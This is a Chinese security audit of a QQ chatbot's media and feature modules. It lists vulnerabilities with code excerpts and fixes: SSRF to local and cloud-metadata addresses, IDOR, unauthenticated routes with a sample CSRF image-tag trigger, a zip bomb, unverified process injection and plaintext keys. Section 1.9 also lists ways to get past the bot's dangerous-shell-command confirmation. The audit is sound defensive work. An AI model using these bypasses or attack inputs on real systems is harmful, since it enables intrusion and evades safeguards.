# DSH QBot（Aurabot）媒体 / 功能域审计

> 审计范围：`src/stickers/*`、`src/song/*`、`src/voice/*`、`src/providers/image/*`、`src/image/*`、`src/bili/*`、`src/persona/*`、`src/features/*`（mood / memory / companion / qq-profile / stickers）、`src/modules/*`（含各内置模块 `index.js`）、`src/tools/tools.js`、`src/local/*`、`src/purpose/*`、`src/snowluma/manager.js`、`src/security/danger.js`。
> 方式：只读静态审计（未修改任何源码、未执行攻击脚本）；行号来自当前工作树。
> 结论口径：P0 = 可直接造成远程代码执行 / 大规模数据泄露 / 不可逆破坏；P1 = 高概率安全或数据一致性问题，需优先修；P2 = 明确行为错误或重要缺陷；P3 = 质量、性能、可维护性问题。

## 0. 风险总览

| 等级 | 数量 | 主题 |
|---|---:|---|
| P0 | 0 | 本次未发现无需本地权限即可确定性触发的 P0；`M-07`（模块路由鉴权）与 `M-06`（生图资产 IDOR）在面板端口被非本机访问或跨站请求成功时可按 P0 处理 |
| P1 | 10 | 表情库跨聊天泄露/跨账号 legacy、生图结果 SSRF、图片资产 IDOR、生图面板绕过开关、TTS/翻唱 SSRF、模块 HTTP 无鉴权、SnowLuma 未核验进程注入 |
| P2 | 27 | 审核/超时/静默失败、密钥落库、能力校验不一致、RVC 降级、zip 解压、进程残留、人格绑定全局失效、B 站配额/副作用、重复发送风险等 |
| P3 | 10 | 死代码、N+1、配额日界、配置双轨、截断、文档化限制等 |

**最高优先级：先修 `M-07`（模块路由鉴权，牵涉所有内置模块）、`M-06`（生图资产 IDOR）、`M-05`（图片结果 URL SSRF）、`M-09`/`M-20`（TTS/翻唱外连 SSRF）、`M-10`（SnowLuma 注入）。**

---

## 1. 各子域一句话现状

### 1.1 表情包（stickers）
采集→分析→审核→选择→发送的链路是完整的：SQLite 状态机、任务租约、来源核验、动画关键帧、QQ 收藏同步和失败对账都考虑得比较细；但默认“账号级共用图库”绕过了共享组策略，legacy 隔离表没有账号维度，decision 的 `ready` 状态存在可永久卡住聊天的路径，QQ 导入则把所有失败吞成一个计数。

### 1.2 生图（imagegen / providers/image）
五种协议适配器齐全，runner 有租约、幂等和“未知不重发”设计，studio-mask 也做了边界处理；但结果图 URL 下载没有 SSRF 防护，`/imagegen/asset` 等面板接口没有作用域校验，`image_job_configs` 把带 `apiKey` 的完整 profile 明文落库，Gemini/HTTP 适配器又缺少统一的 `checkRequest` 校验，行为与 OpenAI/ComfyUI 不一致。

### 1.3 语音（voice）
TTS 的 HTTP 映射、PCM/WAV/AAC/OGG 识别和 ASR 三级回退（本地接口 → QQ 转写 → DSH 识别）都能工作；但没有 TTS 缓存，RVC 转换是全局单槽且并发时静默降级原声，TTS 自定义映射和 `json-url` 结果地址也没有 SSRF/重定向限制。

### 1.4 翻唱（song）
网易云搜索→下载→分离→RVC→混音→语音条的主流程和元数据匹配做得严谨；但 `download()` 直接 `fetch` 网易云返回的任意 URL，`request({file})` 可读任意本地文件，zip 导入没有解压上限，子进程超时只杀直接子进程，work/results 目录只在成功路径清理。

### 1.5 人格（persona）
draft/publish/rollback、不可变 revision、按聊天绑定、参考图授权与冻结快照都有实现；但任何一次 `bind()` 都递增全局 `persona.bindings` 序号，会让所有聊天里使用图库参考图的生图任务同时失效；旧 Markdown 人格 CRUD 仍然存在并写同一目录，和新 SQLite 服务形成双轨。

### 1.6 B 站（bili）
自动浏览、评论/回复/点赞配额、暂停码、截图取帧和分享回执都做了；但 `/bili/run`、`/bili/replies` 是无方法/无鉴权的 GET 副作用路由，`run({force:true})` 绕过每日浏览上限，自动浏览不检查 `pauseReason`，回复去重又在提交前写 `repliedFeed`，失败会永久跳过。

### 1.7 模块系统（modules）
模块生命周期、卸载清理、热加载、fork、工具/路由归属管理设计不错；但 `mods.handle()` 完全没有鉴权或方法检查，所有模块共用一个 `/aurabot/api` 前缀；模块开关和业务开关是两套，`api.settings()` 的 `config.ext[id]` 与内置模块的顶层 `config.<feature>` 也是两套配置。

### 1.8 SnowLuma manager
检测、后台启动、自动生成密码、端口探测、只注入机器人号、协议同意流程都有防护；但“唯一一个认不出号”的 QQ 进程会在核验前被注入，`findRunningPid()` 用字符串前缀判断进程路径，停止只 `child.kill()`（不等待、不杀进程树），密码还能从面板接口明文读出。

### 1.9 danger.js
它是“危险命令确认”，不是沙箱；只覆盖 `bash`/`pwsh` 和 15 条正则，引号包裹、`--` 分隔、`/bin/bash`、`env bash`、PowerShell `-EncodedCommand`、`Invoke-Expression` 等都可以绕过，且未绑定 QQ 会话时会直接 `next()`。

### 1.10 代码质量
`src/chat/hub.js` 2302 行是最大最杂的文件，`src/song/studio.js` 1198 行把安装器/任务/ffmpeg 全塞在一起，`src/stickers/store.js` 849 行承担了领域服务 + 队列 + 面板；网络下载、ffmpeg 取帧、provider capability 至少各有 3 份重复实现，且安全边界不一致。

---

## 2. 问题清单

### P1

#### M-01｜账号级表情库绕过共享组 / 跨聊天可见（隐私）
- **位置**：`src/stickers/store.js:30`、`:55`、`:142-148`；`src/core/config.js:96`
- **代码证据**：
  ```js
  // store.js:30
  const libraryScope = () => cfg().libraryScope === 'chat' ? 'chat' : 'account'
  // store.js:55
  const visible = (it, viewer) => it.scope.account === viewer.account && (accountLibrary() || canSee(it.scope, viewer, policy()))
  ```
  `policy()` 只在 `libraryScope === 'chat'` 时通过 `canSee` 生效；默认值是 `libraryScope: 'account'`。
- **触发条件**：保持默认配置，从私聊收藏一个表情，然后在群聊中触发自动/显式表情决策。
- **影响**：私聊素材、含个人信息的截图表情会出现在群聊可发送池；`memory.shareGroups`/`mediaPolicy.shareGroups` 对表情库事实上失效。
- **修复建议**：账号级库只共享“显式标记为公开”的素材；默认改为 `chat`，或默认要求 `shareGroups` 授权；`visible()` 在 account 模式至少过滤 `deniedAtTarget` 和按来源聊天/共享组。
- **置信度**：高。

#### M-02｜legacy 隔离表没有账号维度，跨账号可读/删/分配
- **位置**：`src/stickers/schema.js:55-58`；`src/stickers/store.js:107-112`、`:801-826`（`deleteLegacy`/`assignLegacy`）
- **代码证据**：
  ```sql
  CREATE TABLE IF NOT EXISTS sticker_legacy (
    id TEXT PRIMARY KEY, source_key TEXT NOT NULL UNIQUE, state TEXT NOT NULL,
    body_json TEXT NOT NULL, created_at INTEGER NOT NULL, updated_at INTEGER NOT NULL
  );
  ```
  `list()` 直接 `SELECT body_json FROM sticker_legacy WHERE state='quarantined'`，没有 `account` 条件；`deleteLegacy`/`assignLegacy` 也只按 `id` 操作。
- **触发条件**：同一数据库被多个机器人账号使用（或从旧版整体迁移后切换账号），管理员在 A 账号面板执行 legacy 列表/删除/分配。
- **影响**：A 账号管理员可读取、删除或把 B 账号的旧素材分配到 A 账号；多租户部署下是数据泄露/数据破坏。
- **修复建议**：`sticker_legacy` 增加 `account`、`chat`、`persona` 来源列；所有读、删、assign 都带当前账号校验；来源不明时统一进入“待认领”而不是全局可见。
- **置信度**：高（多账号场景）；单账号场景降为 P2。

#### M-03｜表情 decision 的 `ready` 状态可永久卡死当前聊天
- **位置**：`src/stickers/decision.js:240-246`（`makeReady` 写 ready）、`:342-351`（返回前 `decorate` 可抛；finally 对 ready 不清理）、`:104-108`（`skip` 只处理 selecting）、`:111-114`（recover 只在 owner 死亡时处理）；`src/stickers/store.js:201`（BUSY 检查）
- **代码证据**：
  ```js
  const makeReady = (selected, reason, fields = {}) => db.tx(() => {
    ...
    update(id, 'ready', 'SELECTED', reason, { item: selected, ... })
    return true
  })
  ...
  if (!makeReady(...)) return finish(...)
  return { decisionId: id, decision: 'send', explicit: ..., item: decorate(selected, scopeOf(c)), ... }
  } catch (...) { return finish(...) } finally {
    const row = get(id)
    if (row?.state !== 'ready') { active.delete(owner.token); owned.delete(id) }
  }
  ```
  一旦 `makeReady()` 成功、`decorate()` 或调用方 `claimDecision()` 抛错/放弃，`skip()` 看到 `row.state !== 'selecting'` 直接返回，不写 cancelled；`finally` 又因 state 是 ready 不删除 active token。之后 `reserve()` 的 `BUSY` 查询看到 `state='ready'`，该聊天以后每轮都跳过表情。
- **触发条件**：decision 选好后、hub `claimDecision` 前发生异常（例如 `repo.qq()`/`repo.usage()` 的 DB 错误、`decorate` 中资产记录缺失），或调用方拿到 `send` 结果但本回合被取消。
- **影响**：该聊天永久无法再发表情，且没有 TTL 清理；只能重启或手工改库。
- **修复建议**：`finally` 中若 `row.state === 'ready'` 且未被 claim，调用 `settleDecision({status:'cancelled'})`；`skip()` 支持从 ready 转 cancelled；增加 `ready_at` 超时扫描（例如 5 分钟）自动取消。
- **置信度**：中高。

#### M-04｜表情识别超时只 abort，不 race；模型不响应 signal 时任务永久 running
- **位置**：`src/stickers/store.js:447-450`、`:486`、`:601-626`
- **代码证据**：
  ```js
  const timeout = setTimeout(() => {
    ctrl.abort(new Error('表情识别超时'))
    if (repo.owns(t)) repo.db.run('UPDATE sticker_tasks SET error=? WHERE id=?', '识别已超时，等待调用结束释放并发槽', t.id)
  }, clamp(cfg().analysisTimeoutMs, 60000, 10, 180000))
  ...
  const response = await analyzer({ images, frames, ..., signal: ctrl.signal, ... })
  ```
  没有 `Promise.race([analyzer(...), timeoutPromise])`；`repo.claim()` 只按 `state='running'` 计数。
- **触发条件**：视觉服务/网关卡死但不遵守 AbortSignal（或 `askModel` 在某层吞掉 abort）。
- **影响**：该任务永远占住 `stickers.concurrency`（默认 2）的一个槽；后续 collect/analyze 全部排队；队列满后新表情静默停止。
- **修复建议**：用 `Promise.race` 给 `analyzer` 加硬超时，超时后 `repo.finish(t,'unknown',{outcome:'unknown'})`，并把 `analysis.state='unknown'`；模型调用必须传 signal 且超时后不再写结果。
- **置信度**：中。

#### M-05｜生图结果 URL 下载存在 SSRF（含重定向）
- **位置**：`src/providers/image/common.js:154-164`（`validateHttpUrl` 只查协议/端口/凭据）、`:171-225`（`request` 直接用 `fetchImpl`，默认跟随重定向）、`:443-461`（`outputFrom` 对服务返回的 `item.url` 直接 GET）
- **代码证据**：
  ```js
  export function validateHttpUrl(value) {
    ...
    if (!['http:', 'https:'].includes(url.protocol) || !url.hostname) throw ...
    if (url.username || url.password) throw ...
    if (url.port !== '' && BLOCKED_PORTS.has(Number(url.port))) throw ...
    return url
  }
  ...
  r = await Promise.race([fetchImpl(target.href, { ...init, signal: sig }), aborted])
  ...
  } else if (item?.url || typeof item === 'string') {
    const r = await request(fetchImpl, item?.url || item, { method: 'GET' }, ...)
  ```
  没有调用 `src/core/net.js` 的 `assertPublicUrl/resolvePublicUrl`，也没有 `redirect:'error'` 或逐跳 DNS 固定。
- **触发条件**：被攻破/恶意的 OpenAI 兼容中转站、HTTP 映射服务返回 `url: "http://127.0.0.1:xxxx/..."`，或返回公网 URL 再 302 到内网/云元数据地址。
- **影响**：服务端可被诱导访问本机管理接口、云元数据（169.254.169.254）和内网服务；GET 副作用可被触发，错误信息可能带出响应片段。
- **修复建议**：所有 provider 的 `outputFrom`/结果下载统一使用 `createSearchHttp({allowAnyPort:false})` 或 `resolvePublicUrl` + DNS pinning；`redirect:'error'`；拒绝私网、保留地址、映射 IPv4/IPv6。
- **置信度**：高。

#### M-06｜`/imagegen/asset` 任意资产 IDOR，`/imagegen/jobs` 跨聊天泄露
- **位置**：`src/modules/imagegen/index.js:275-282`、`:337-342`
- **代码证据**：
  ```js
  api.route('/imagegen/jobs', async (req) => {
    const q = http.query(req)
    return { ok: true, list: runner.list({ chatId: q.chatId || undefined, limit: Number(q.limit) || 40 }).map(jobView) }
  })
  ...
  api.route('/imagegen/asset', async (req, res) => {
    const a = storage.assets.get(http.query(req).id)
    if (!a) return { ok: false, message: '没有这张图' }
    http.send(res, 200, readFileSync(storage.assets.pathOf(a)), a.mime)
  })
  ```
  `storage.assets` 是全局内容寻址库，包含人设参考图、私聊图片、其他聊天的生成结果；`/imagegen/job` 同样只按 `id` 查。没有 `galleryScope`、`chatId`、`actorId`、`persona` 校验。
- **触发条件**：任何能访问面板 API 的客户端拿到/猜到 asset id（`/imagegen/jobs` 会返回 `output.assetIds` 和 `lineage`）；或同源页面/本地进程直接请求。
- **影响**：可读取任意用户图片、人设参考图、生成结果；再配合 `/imagegen/submit` 的 `refs[].assetId` 可作为底图做二次生成并发送到任意聊天，形成数据外带链。
- **修复建议**：`/imagegen/asset` 必须复用 `galleryScope` 或 job 归属校验；`/imagegen/jobs` 默认只返回当前聊天/当前 actor；所有面板路由加 `requireOwnerPanel`。
- **置信度**：高（代码事实）；影响取决于 host 的鉴权边界。

#### M-07｜模块 HTTP 路由完全没有鉴权/方法校验（横切）
- **位置**：`src/core/modules.js:627-631`（`handle()` 直接执行路由）、`src/host.js:383-392`（prefix 路由把所有 `/aurabot/api/*` 直接转给模块）；示例：`src/modules/bili/index.js:148-153`、`src/modules/song/index.js:94-124`、`src/modules/imagegen/index.js:275-342`、`src/modules/stickers/index.js:15-19`、`:93-112`、`src/modules/voice/index.js:152-188`
- **代码证据**：
  ```js
  async function handle(path, req, res) {
    const r = routes.get(path)
    if (!r || !live.has(r.id)) return { ok: false, message: '这个功能所在的模块没开...', moduleOff: true }
    return r.handler(req, res)
  }
  ```
  路由 handler 收到 `req` 后没有检查 `req.method`、会话身份、owner、allow list；`stickers` 的 `adminOptions` 直接把 `admin:true` 塞给所有 HTTP 请求。
- **触发条件**：DSH Web GUI 如果监听在非回环地址、被反向代理暴露，或浏览器存在同源/CSRF 场景；甚至任意本地页面可以通过 `<img src="/aurabot/api/bili/run">` 触发 GET 副作用。
- **影响**：可远程触发 B 站发评论/点赞（`/bili/run`、`/bili/replies`）、安装数 GB 依赖（`/song/install`）、生成并发送图片/翻唱、删除/审核表情、读取 `asr-last` 的私聊语音转写。若 host 鉴权缺失，这是 P0 级。
- **修复建议**：在 `mods.handle()` 或 `host` 层统一加 `requireOwner`/CSRF token/`POST-only` 策略；每个模块声明路由的 method、scope、ownerOnly；`adminOptions` 不能无条件 `admin:true`。
- **置信度**：高（无鉴权代码事实）；可利用性取决于部署。

#### M-08｜`/imagegen/submit` 绕过 `imageGen.enabled`、ownerOnly 和 allow list，可向任意 QQ 发送
- **位置**：`src/modules/imagegen/index.js:284-320`、`:41`；`src/jobs/image.js:153-167`、`:305-311`
- **代码证据**：
  ```js
  const enabled = () => svc.profiles().length > 0 && (api.config().imageGen.enabled || local.active('image'))
  ...
  api.route('/imagegen/submit', async (req) => {
    ...
    const chatId = String(b.chatId || `private:${api.config().ownerQQ}`)
    if (!/^(private|group):\d+$/.test(chatId)) return ...
    ...
    const job = svc.enqueue(runner, { kind: 'image', chatId, actorId: api.config().ownerQQ, ... })
  ```
  `svc.enqueue`/`profiles()` 没有检查 `imageGen.enabled`；`chatId` 只做正则校验，不检查 `cfg.allow.groups/private`；`deliver` 直接 `hub.sendImageAssets(job.chatId, ...)`，不经过 `checkAllowed`。
- **触发条件**：面板 API 可访问（无论功能开关是否打开）；构造 `chatId: "group:<任意群>"` 或 `private:<任意QQ>`。
- **影响**：关闭生图功能后仍可产生费用和发送图片；可向非白名单群/陌生人发图，形成骚扰或数据外泄。
- **修复建议**：`svc.enqueue` 入口检查 `imageGen.enabled`；`/imagegen/submit` 校验 `checkAllowed` 与 ownerOnly；`hub.sendImageAssets` 在发送前再检查 `checkAllowed`/epoch。
- **置信度**：高。

#### M-09｜TTS 自定义映射 / `json-url` / 重定向的 SSRF
- **位置**：`src/voice/tts.js:29-30`（`fetchBytes` 直接 `fetch(url)`）、`:209-233`（`httpSynth` 的 `c.url`、`c.response === 'json-url'` 的 `v` 直接 `fetchBytes`）
- **代码证据**：
  ```js
  async function fetchBytes(url, init, timeoutMs) {
    const r = await fetch(url, { ...init, signal: AbortSignal.timeout(timeoutMs) })
  ...
  const url = fill(c.url, vars, 'url')
  if (!/^https?:\/\//.test(url)) throw ...
  ...
  if (!/^https?:\/\//.test(v)) throw ...
  const result = await fetchBytes(v, { method: 'GET' }, c.timeoutMs || 120000)
  ```
  没有 `assertPublicUrl`；URL 校验只检查协议，且 fetch 默认跟随重定向。
- **触发条件**：语音服务是恶意/被劫持的 HTTP 映射，返回 `json-url: "http://127.0.0.1:..."`；或配置了会被 DNS/重定向到内网的地址。
- **影响**：SSRF 到本机控制面、内网 HTTP 服务；返回内容会进入 `normalizeAudio`，错误文本可能回到面板/日志。
- **修复建议**：与 `core/net.fetchImage` 统一使用公共 URL 校验；`json-url` 响应地址必须走 `resolvePublicUrl`；禁止重定向或逐跳校验。
- **置信度**：高。

#### M-10｜SnowLuma 会把插件注入“唯一一个认不出号”的任意 QQ 进程，再才核验
- **位置**：`src/snowluma/manager.js:133-143`（`pickBotProcess` 返回 `unverified:true`）、`:326-355`（`attachBot` 立刻 `/api/processes/{pid}/load`）、`:358-389`（`confirmLogin` 才核对 uin）
- **代码证据**：
  ```js
  const unknown = all.filter((p) => !uinOf(p) && !skip.has(Number(p?.pid)))
  if (unknown.length === 1) return { proc: unknown[0], reason: '', unverified: true }
  ...
  const { proc, reason, unverified } = pickBotProcess(list, bot, { exclude: [...rejected] })
  ...
  const r = await api(`/api/processes/${proc.pid}/load`, { method: 'POST' })
  ```
- **触发条件**：SnowLuma 的 `/api/processes` 对当前登录 QQ 返回 `account:null`，且机器上只有这一个无法识别的 QQ 进程（常见于首次登录/隐私模式）。
- **影响**：可能把 SnowLuma 注入主人的主号进程；OneBot 会以主号身份连接一段时间，期间消息/接口调用风险由主号承担；`unload` 不保证成功，最坏需要重启 QQ。即使最终 `confirmLogin` 拒绝，也已经发生了注入。
- **修复建议**：只允许在 WebUI 中由用户确认 pid 后注入；或注入前通过 `get_login_info`/进程扫码结果二次确认；把 `unverified` 路径改为“先要求用户关闭其他 QQ，或手工选择”。
- **置信度**：高（行为）；实际利用取决于用户操作和 SnowLuma 返回。

### P2

#### M-11｜表情自动审核把模型 approve 直接变成可用，无人工兜底
- **位置**：`src/stickers/store.js:270-272`（`autoReviewEligible` 对 panel/manual/tool 无条件 true）、`:515-519`（`autoReview !== false` 即自动改 state）；`src/core/config.js:97`（`autoReview: true`）
- **证据**：
  ```js
  autoReviewEligible: Boolean(source?.messageId) || ['panel','manual','tool'].includes(from)
  ...
  if (item.state === 'pending' && item.review.kind !== 'manual' && cfg().autoReview !== false && item.autoReviewEligible === true) {
    if (result.decision === 'approve') item.state = 'approved'
    if (result.decision === 'reject') item.state = 'rejected'
  }
  ```
- **触发条件**：默认配置下，任意新收藏/面板上传；模型分析返回 approve。
- **影响**：未经人工查看的图片会进入可发送池；图片内嵌文字/诱导性内容可能影响模型判断（分析 prompt 已声明数据，但不是内容安全审核）。动画只基于部分帧时也可能误批。
- **修复建议**：`panel/manual` 上传至少要求管理员确认；自动审核只对 `source.messageId` 且 `decision==='approve'` + `coverage==='still_image'` 生效；增加敏感词/NSFW 二次检查或人工抽检。
- **置信度**：高。

#### M-12｜表情决策阻塞正文发送，最坏 15 秒 + 预览时间
- **位置**：`src/stickers/decision.js:229-236`、`src/chat/hub.js:870-874`
- **证据**：`decideForReply` 在 `deliver` 组装 outbox 之前 await；`decisionTimeoutMs` 默认 15s，预览阶段还要跑最多 3 个 ffmpeg（`preview.js:15-22`）。
- **触发条件**：视觉模型慢/不可用、候选多、ffmpeg 解码慢。
- **影响**：用户看到“正在输入”后长时间没有正文；在群聊里可能被误认为不回复，甚至超过请求轮次时限。
- **修复建议**：正文先发，表情作为独立后续消息（或把 decision 放到与文本发送并行的 Promise，超时仅放弃表情）；给 decision 设 2-3 秒预算并在超时时立即跳过。
- **置信度**：高。

#### M-13｜QQ 收藏导入逐条吞错，只返回 failed 计数
- **位置**：`src/stickers/store.js:780-798`
- **证据**：
  ```js
  for (const entry of entries.slice(0, t.input.limit)) {
    try { ... } catch { failed++ }
  }
  repo.finish(t, 'done', { output: { added, existed, failed, total: entries.length } })
  ```
- **触发条件**：QQ 返回无效 URL、图片超 5MB、库满、哈希 tombstone、任务并发等。
- **影响**：面板只看到“失败 N 张”，没有 URL/错误码/可重试信息；用户无法排查，运维无法告警；属于**静默失败**。
- **修复建议**：catch 中记录 `{index,url,code,message}` 到 output，并 `log.warn`；`failed>0` 时任务状态 `partial` 或面板标记；对可重试错误（网络/超时）单独计数。
- **置信度**：高。

#### M-14｜表情 decision 的兼容入口 `sendSticker()` 实际永远不发
- **位置**：`src/chat/hub.js:734-737`、`src/stickers/decision.js:199`
- **证据**：`sendSticker` 调用 `deliver(chatId, '', { ...options, allowEmpty: true, suggestions: [...] })`，但 `reserve()` 在非明确请求且 `replyText` 为空时直接 `EMPTY_REPLY`；`suggestions` 只进入模型提示，不参与该检查。
- **触发条件**：任何插件/旧调用方使用 `hub.sendSticker(chatId, '贴纸名')`。
- **影响**：接口返回 false，静默不发送；兼容层形同虚设。
- **修复建议**：给 `sendSticker` 传一个非空 `replyText`（例如 `String(suggestion)`），或在 `reserve` 中将 `suggestions` 作为可信“用户明确请求”的证据。
- **置信度**：高。

#### M-15｜`image_job_configs` 明文保存完整生图 profile（含 apiKey）
- **位置**：`src/jobs/image.js:33-34`、`:153-159`；`src/core/config.js:408-420`
- **证据**：
  ```js
  // 配置快照不进入 input_json：任务接口可展示输入，但绝不能把服务密钥一并返回。
  const savedProfile = (id) => fromJson(storage.db.get('SELECT profile_json FROM image_job_configs WHERE job_id = ?', id)?.profile_json, null)
  ...
  storage.db.run('INSERT INTO image_job_configs(job_id, profile_json, created_at) VALUES (?, ?, ?)', job.id, toJson(profile), ...)
  ```
  `normalizeImageProfiles` 生成的 profile 含 `apiKey`、`extra.headers` 等；`image_job_configs` 没有清理/加密。
- **触发条件**：数据库文件、备份、迁移包、任意能读 SQLite 的本地程序/模块。
- **影响**：生图 API key 长期明文驻留，即使删除 profile/任务也不一定清除（没有清理逻辑）；属于**密钥泄漏**。
- **修复建议**：快照只存 `id/protocol/baseUrl/model/caps` 等非机密字段，密钥通过 `credentialRef` 在提交时从安全存储取；或使用 OS keychain；至少对 `profile_json.apiKey` 加密并做迁移；任务完成后清理。
- **置信度**：高。

#### M-16｜Gemini / HTTP 适配器绕过 `checkRequest` 和统一能力校验
- **位置**：`src/providers/image/gemini.js:65-82`、`src/providers/image/http.js:167-221`；对照 `src/providers/image/openai.js:35-38`、`src/providers/image/comfyui.js:99-103`、`src/providers/image/studio.js:112-121`
- **证据**：Gemini `submit` 只检查 `req.mode==='mask'`，没有 `checkRequest(req, caps)`，不校验 `maxInputs`、`n`、输入图 MIME 与字节是否一致；HTTP `submit` 只 `assertProfile()`，`imagesJson` 直接使用 `im.mime`，不校验实际字节。
- **触发条件**：直接调用 adapter；profile 能力后来被收窄；输入图 MIME 伪装；HTTP 映射声明了 text 但实际提交 edit。
- **影响**：不支持的模式/超量输入仍被发送；Gemini 可能收到 `image/bmp` 等不支持 MIME；HTTP 映射可能静默丢图或生成错误请求，行为与 OpenAI/ComfyUI 不一致。
- **修复建议**：所有 adapter 在 `submit` 第一行调用 `checkRequest(req, mergedCaps)`；统一 `imageInfo` 验证输入字节与 MIME；把 capability 校验抽到 `common.js` 的 `prepareRequest`。
- **置信度**：高。

#### M-17｜蒙版校验延迟到 adapter，队列先排队再失败
- **位置**：`src/jobs/image.js:70-82`、`:146-148`、`:377-380`；`src/modules/imagegen/index.js:316-318`
- **证据**：`validateInput` 只 `imageReferenceBytes(storage, input.maskAssetId)`，不检查 PNG/尺寸/alpha；`pickProfile` 传 `mask: {}`；`buildRequest` 直接把 `asset.mime` 放进 `mask`；真正 `checkRequest` 在 adapter 的 `submit`。
- **触发条件**：面板 `maskAssetId` 指向 JPEG、非 PNG、与底图尺寸不一致或没有 alpha 的图片。
- **影响**：任务先占 `perChat` 队列、等参考图、可能已消耗视觉/排队时间；最后 adapter 报 invalid，用户只看到失败，且 `image_job_configs` 留下无用记录。
- **修复建议**：`validateInput`/`prepare` 阶段用 `imageInfo` 检查 mask：PNG、有 alpha、与 base 同尺寸；不合法直接拒绝，不入队。
- **置信度**：高。

#### M-18｜RVC 转换全局单槽，并发语音静默回落原声
- **位置**：`src/song/studio.js:442-444`、`src/modules/voice/index.js:135-148`
- **证据**：
  ```js
  if (speechBusy || current) throw new Error('RVC 语音转换正忙')
  ...
  } catch (error) {
    if (!current() || settings.fallback === 'error') throw error
    api.log?.warn?.('RVC 转换失败，使用原声：', error.message)
    return { ...result, engine: result.engine + '+rvc-fallback', rvcError: error.message }
  }
  ```
- **触发条件**：两条语音回复几乎同时生成（群聊/多请求），或翻唱任务正在跑。
- **影响**：后到的语音直接使用未转换 TTS 原声，用户听到音色不一致；`rvcError` 不展示到聊天，属于静默降级。
- **修复建议**：RVC 转换按 chat 排队而不是全局单槽；忙时明确告知“这次先用默认音色”或等待；至少记录/面板显示 fallback 次数。
- **置信度**：高。

#### M-19｜TTS 每次重新合成，voice-cache 只清理不复用
- **位置**：`src/voice/tts.js:16-27`、`:178-181`；`src/modules/voice/index.js:112-150`
- **证据**：`save()` 每次 `randomUUID()` 新文件；`outDir()` 只删除 24h 前文件；`textToSpeech` 没有 `text+voice+provider` 缓存键。
- **触发条件**：重复的固定话术（“在呢”“晚安”）、重试同一句。
- **影响**：重复调用付费 TTS，延迟和费用线性增长；缓存目录只增不减（每天清理一次）。
- **修复建议**：按 `sha256(provider, voice, speed, text)` 做 LRU 缓存；命中直接返回文件；缓存上限与 TTL 可配置。
- **置信度**：高。

#### M-20｜翻唱下载 URL 无 SSRF 防护
- **位置**：`src/song/studio.js:741-760`、`src/song/selection.js:15-21`
- **证据**：`const r = await fetch(pick.url, ...)`，`pick.url` 来自 `catalog.songUrl()`（网易云 API 响应），没有 `assertPublicUrl`，默认跟随重定向。
- **触发条件**：网易云接口被劫持/返回恶意 URL，或 `songUrl` 上游被污染。
- **影响**：服务端 GET 内网/元数据地址；下载内容会写入 `song.mp3` 并进入 ffmpeg 处理。
- **修复建议**：使用 `createSearchHttp`/`resolvePublicUrl` 校验；限制 80/443；`redirect:'error'`；下载后校验音频头。
- **置信度**：中高。

#### M-21｜`song.request({file})` 可读任意本地文件并当“翻唱成品”发送
- **位置**：`src/song/studio.js:1138-1176`、`:828-840`；`src/song/match.js:42-44`（`intent.file` 走 `provided_file` 不核验原曲）
- **证据**：`request` 接收 `file` 并写入 job input；`process1` 里 `const song = job.file || await download(...)`；`assertSongResult` 对 `intent.file` 直接返回 `provided_file`，`sendVoiceFile` 会 `readFileSync(file)`。
- **触发条件**：任意能调用 `song.request` 的内部模块/测试/扩展脚本（当前面板路由和工具没有暴露 `file`，所以是内部信任边界问题）。
- **影响**：任意本地音频文件被读取、转码并以机器人语音发送；若文件是系统敏感音频/录音，属于**路径/文件读取**面。
- **修复建议**：对 `file` 做路径白名单（仅 `work()/results`、用户上传目录）和 `audio` 头校验；禁止外部调用者传任意路径；或删除该入口。
- **置信度**：中高（代码事实，外部暴露面有限）。

#### M-22｜zip 导入没有解压上限，1GB 上传可做 zip bomb
- **位置**：`src/modules/song/index.js:103-114`、`src/song/zip.js:19-52`
- **证据**：
  ```js
  const buf = await http.raw(req, 1024 * 1024 * 1024)
  ...
  else if (method === 8) data = inflateRawSync(raw)
  ```
  `readZip` 对每个 entry 没有 `maxOutputLength`，也没有总解压大小上限。
- **触发条件**：面板导入 `.zip`，包含高压缩比的大文件（例如几 KB 压缩成几 GB）。
- **影响**：Node 进程内存暴涨/OOM，磁盘被 `writeFileSync` 写满；属于 DoS。
- **修复建议**：`inflateRawSync(raw, { maxOutputLength })`；限制 entry 数量、单文件/总解压字节；上传上限降到模型实际大小（例如 2GB 仍不合理，应按模型大小）。
- **置信度**：高。

#### M-23｜翻唱子进程超时只杀直接子进程，`work/results` 只成功路径清理
- **位置**：`src/song/studio.js:357-379`（`child.kill()`）、`:828-835`（每次建 work dir）、`:987-992`（成功后 `removeWork`）、`:329-335`（cache 只保留 40）
- **证据**：`run()` 超时/abort 只 `child.kill()`；Python/ffmpeg 可能派生子进程；失败或取消不会执行 `removeWork(r.dir)`；`results` 下的 `<jobid>.mp3` 永不清理。
- **触发条件**：长时间 ffmpeg/Python 转换、用户取消、任务失败。
- **影响**：残留 GPU/CPU 进程、临时 wav/mp3 占满磁盘；`results` 会随历史任务无限增长。
- **修复建议**：使用进程组/job object 杀整棵树，等待 `exit`；在 `finally` 清理 work dir；对 `results` 做 TTL/容量淘汰，仅保留有 `receipt` 的结果。
- **置信度**：高。

#### M-24｜人格 `bindingRevision` 是全局序号，任一绑定变化会让所有生图任务参考图失效
- **位置**：`src/persona/store.js:269-288`、`src/jobs/image.js:35-40`
- **证据**：`bind()` 每次都 `storage.nextSeq('persona.bindings')`；`bindingRevision()` 返回全局序号；`referenceVisible()` 要求 `persona.bindingRevision === expected.bindingRevision`。
- **触发条件**：在任意聊天新增/修改一条 persona 绑定（包括 `applyScopeDefaults`、`compat.use`），而另一个聊天有使用 `galleryId`/persona 参考图的生图任务正在准备/重试。
- **影响**：旧任务参考图被判定不可见，`prepare`/`deliver` 失败或取消；用户以为任务丢失。属于跨聊天竞态。
- **修复建议**：按 `persona_id`（或 scope）记录 revision，不因别的聊天绑定而递增；任务快照只关心自己 persona 的 revision + 自身绑定 scope。
- **置信度**：高。

#### M-25｜旧版 Markdown 人格 CRUD 与新 SQLite 服务双轨
- **位置**：`src/persona/personas.js:13-19`（`seedPersonas` 复制 `personas/*.md`）、`:40-80`（list/read/save/delete/current）；`src/persona/service.js:54-113`（新 SQLite 导入/seed）
- **证据**：`personas.js` 仍导出 `savePersona/deletePersona/currentPersonaText` 直接写 `dataDir('personas')/*.md`；`service.importLegacy()` 只在首次启动导入，之后旧文件变化不会进入 SQLite；`rulesText`/`parsePersona` 仍被 host 使用，所以文件不能简单删除，需拆分。
- **触发条件**：任何旧代码、扩展模块或维护脚本调用 `savePersona` 改 Markdown；或用户手工改 `personas/*.md`。
